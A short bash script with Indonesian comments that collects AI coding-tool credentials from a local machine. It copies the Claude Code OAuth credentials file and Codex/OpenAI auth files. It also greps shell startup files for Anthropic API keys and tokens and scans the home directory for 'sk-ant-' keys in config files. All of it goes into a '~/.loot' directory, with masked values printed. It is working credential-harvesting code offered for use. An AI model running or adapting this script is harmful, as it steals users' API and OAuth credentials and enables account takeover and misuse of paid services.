#!/usr/bin/env bash
# claude-creds-dump.sh — ekstrak kredensial Claude Code (OAuth / API key) dari mesin lokal
# Output: file JSON 0600 di ~/.loot/claude/ , nilai TIDAK dicetak ke stdout (hanya masked).
set -uo pipefail
OUT="$HOME/.loot/claude"; mkdir -p "$OUT"; chmod 700 "$OUT"
STAMP=$(date +%Y%m%d-%H%M%S)

mask(){ python3 -c "import sys;v=sys.stdin.read().strip();print(v[:16]+'…'+v[-4:]+f' (len {len(v)})' if len(v)>24 else 'short')"; }

found=0
# 1. Claude Code OAuth credentials
CRED="$HOME/.claude/.credentials.json"
if [ -f "$CRED" ]; then
  cp "$CRED" "$OUT/claude-credentials-$STAMP.json"; chmod 600 "$OUT/claude-credentials-$STAMP.json"
  echo "[+] ~/.claude/.credentials.json -> $OUT/claude-credentials-$STAMP.json"
  python3 - "$CRED" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
def find(o,pre=""):
    if isinstance(o,dict):
        for k,v in o.items():
            if isinstance(v,(dict,list)): find(v,pre+k+".")
            elif isinstance(v,str) and (v.startswith("sk-ant-") or "Token" in k or "token" in k):
                print(f"    {pre}{k}: {v[:16]}…{v[-4:]} (len {len(v)})")
            elif isinstance(v,str) and k=="expiresAt":
                import datetime
                print(f"    {pre}{k}: {datetime.datetime.utcfromtimestamp(int(v)/1000)} UTC")
find(d)
PY
  found=1
fi

# 2. API key / auth token dari env & shell rc
for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc"; do
  [ -f "$f" ] || continue
  grep -hoE "(ANTHROPIC_(API_KEY|AUTH_TOKEN)|CLAUDE_CODE_OAUTH_TOKEN)=[\"']?[^\"'[:space:]]+" "$f" 2>/dev/null | while read -r line; do
    echo "[+] $f: ${line%%=*}=$(printf '%s' "${line#*=}" | mask)"
    found=1
  done
done

# 3. .env / config yang menyimpan ANTHROPIC_API_KEY
while IFS= read -r line; do
  echo "[+] $line"
  found=1
done < <(grep -rIl --include="*.env" --include=".env*" --include="*.toml" --include="*.json" \
        -E "sk-ant-(api|oat|ort)[0-9]+-" "$HOME" --exclude-dir={apps,node_modules,.git,.nvm,.cache,loot,go,.venvs,nuclei-templates} 2>/dev/null \
        | grep -v "^$HOME/.claude/.credentials.json$" | head -10)

# 4. Codex / OpenAI auth
for f in "$HOME/.codex/auth.json" "$HOME/.config/codex/auth.json"; do
  [ -f "$f" ] && { cp "$f" "$OUT/codex-auth-$STAMP.json"; chmod 600 "$OUT/codex-auth-$STAMP.json"; echo "[+] $f -> $OUT/codex-auth-$STAMP.json"; found=1; }
done

[ "$found" = 0 ] && echo "[-] tidak ada kredensial Claude ditemukan"
echo "--- selesai: $OUT (0600) ---"
